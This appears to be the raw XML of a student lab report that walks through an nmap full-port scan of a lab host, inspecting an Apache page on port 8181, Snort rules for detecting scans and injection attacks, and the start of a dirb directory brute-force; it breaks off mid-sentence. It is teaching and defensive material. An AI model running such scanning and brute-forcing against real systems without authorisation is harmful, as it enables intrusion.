      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>oA</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> the output into file</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE4C10" w:rsidRDefault="00CE4C10" w:rsidP="00536E41">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">The attacker </w:t>
      </w:r>
      <w:r w:rsidR="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sees</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4 open ports 53</w:t>
      </w:r>
      <w:r w:rsidR="004E5063" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>, 80, 5601, 8181</w:t>
      </w:r>
      <w:r w:rsidR="004E5063">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>. T</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">he attacker checked ports 80,53,5601 and nothing comes back we can’t find information, the only port that works </w:t>
      </w:r>
      <w:r w:rsidR="004E5063" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>well</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and we see </w:t>
      </w:r>
      <w:r w:rsidR="004E5063">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">welcome page </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>port</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 8181</w:t>
      </w:r>
      <w:r w:rsidR="004E5063">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="004E5063">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>et’s enumerate this port.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A835F7" w:rsidRPr="001B1649" w:rsidRDefault="00A835F7" w:rsidP="00CE4C10">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="257E8A01" wp14:editId="1B650159">
            <wp:extent cx="5486400" cy="2000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000885"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A835F7" w:rsidRPr="00A835F7" w:rsidRDefault="00A835F7" w:rsidP="00A835F7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Command: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> -p- -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sV</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 10.0.0.4 -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>oA</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> Lab</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A835F7" w:rsidRPr="00A835F7" w:rsidRDefault="00A835F7" w:rsidP="00A835F7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>-p-  scan all ports</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A835F7" w:rsidRPr="00A835F7" w:rsidRDefault="00A835F7" w:rsidP="00A835F7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> run default script</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A835F7" w:rsidRPr="00A835F7" w:rsidRDefault="00A835F7" w:rsidP="00A835F7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sV</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> enumerate versions of the services</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A835F7" w:rsidRPr="00A835F7" w:rsidRDefault="00A835F7" w:rsidP="00A835F7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>oA</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> the output into file</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00816271" w:rsidRDefault="00A835F7" w:rsidP="00A835F7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">The attacker sees 4 open ports 53,80,5601,8181, the attacker checked ports 80,53,5601 and nothing comes back we can’t find </w:t>
      </w:r>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">information, the only port that works good and we see welcome page </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>port</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00A835F7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 8181 let’s enumerate this port.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1307F" w:rsidRDefault="00E1307F" w:rsidP="00A835F7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00E1307F" w:rsidRDefault="00B1730E" w:rsidP="00A835F7">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId10" w:history="1">
        <w:r w:rsidR="00E1307F" w:rsidRPr="00F60524">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://10.0.0.4:8181/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00E1307F" w:rsidRDefault="00E1307F" w:rsidP="00A835F7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4108D114" wp14:editId="14FCF7CF">
            <wp:extent cx="5486400" cy="2413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413000"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1307F" w:rsidRDefault="00E1307F" w:rsidP="00E1307F">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Here above after we browse to port 8181 which the port we find that open from our last scan, we see </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> just welcome page of apache not so interesting, we need enumerate files and directories from this server. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1307F" w:rsidRDefault="00E1307F" w:rsidP="00E1307F">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">now we can use tools like </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>dirbuster</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>dirb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to brute force directories let’s try that.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A44C72" w:rsidRDefault="00A44C72" w:rsidP="00E1307F">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="004E5063" w:rsidRDefault="004E5063" w:rsidP="00536E41">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C0745" w:rsidRDefault="00A44C72" w:rsidP="00944C35">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Network</w:t>
      </w:r>
      <w:r w:rsidRPr="00CE4C10">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> Scanning</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> Detection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C0745" w:rsidRPr="004C0745" w:rsidRDefault="004C0745" w:rsidP="004C0745">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00A44C72" w:rsidRPr="00CE4C10" w:rsidRDefault="00697652" w:rsidP="00A44C72">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="14357175">
            <wp:extent cx="5487035" cy="452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7035" cy="4523740"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A44C72" w:rsidRDefault="00697652" w:rsidP="00536E41">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Our first tool for defense will be snort here above we got snort rules for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> scanning, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> injection attacks and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>os</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> command </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">injection. We will try to monitor the attacks and see if we can </w:t>
      </w:r>
      <w:r w:rsidR="00746462">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> alerts about malicious activities </w:t>
      </w:r>
      <w:r w:rsidR="004E5063">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">against </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>our network.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00746462" w:rsidRDefault="00746462" w:rsidP="00A44C72">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1049E7A0" wp14:editId="7E47990C">
            <wp:extent cx="5486400" cy="35953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95370"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00746462" w:rsidRDefault="00746462" w:rsidP="00746462">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00746462" w:rsidRDefault="00746462" w:rsidP="00536E41">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>As we can see from the picture above</w:t>
      </w:r>
      <w:r w:rsidR="004E5063">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> our snort rule</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> for scanning wo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>rks perfect</w:t>
      </w:r>
      <w:r w:rsidR="004E5063">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>. Moreover, we</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> see the source </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> which is the attacker</w:t>
      </w:r>
      <w:r w:rsidR="004E5063">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> that</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> established a lot of connection </w:t>
      </w:r>
      <w:r w:rsidR="004E5063">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">different ports at the same second which can indicate about malicious activity or running some scripts to make this </w:t>
      </w:r>
      <w:r w:rsidR="005B1902">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>automatically</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="004C0745">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C0745" w:rsidRDefault="004C0745" w:rsidP="00746462">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00536E41" w:rsidRDefault="00536E41" w:rsidP="00746462">
      <w:pPr>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00536E41" w:rsidRDefault="00536E41" w:rsidP="00746462">
      <w:pPr>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="004C0745" w:rsidRPr="00944C35" w:rsidRDefault="004C0745" w:rsidP="00746462">
      <w:pPr>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Brute-Forcing Directories</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C0745" w:rsidRDefault="004C0745" w:rsidP="00746462">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7CC4F22F" wp14:editId="2A8BF787">
            <wp:extent cx="5486400" cy="4267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267835"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C0745" w:rsidRDefault="004C0745" w:rsidP="004C0745">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">We run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>dirb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> with wordlist and brute force some directories and files</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> the most interesting for the attacker </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
